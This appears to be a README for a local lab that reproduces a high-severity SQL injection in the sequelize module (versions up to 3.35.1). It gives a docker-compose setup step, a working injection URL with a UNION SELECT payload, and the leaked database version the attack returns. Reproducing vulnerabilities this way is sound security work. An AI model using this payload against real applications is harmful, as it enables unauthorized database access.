# SQL Injection @ sequelize
- module : sequelize
- version : <= 3.35.1
- severity: high

# Installation

`docker-compose up --build`

# Lunch Attack

- ### Browser [open the browser and enter the following url]
    `http://localhost:8000/?search=a')) AS DECIMAL) = 1 UNION SELECT VERSION(); -- -`

- the response will be `[{"name":"10.3.15-MariaDB-1","target":null}]`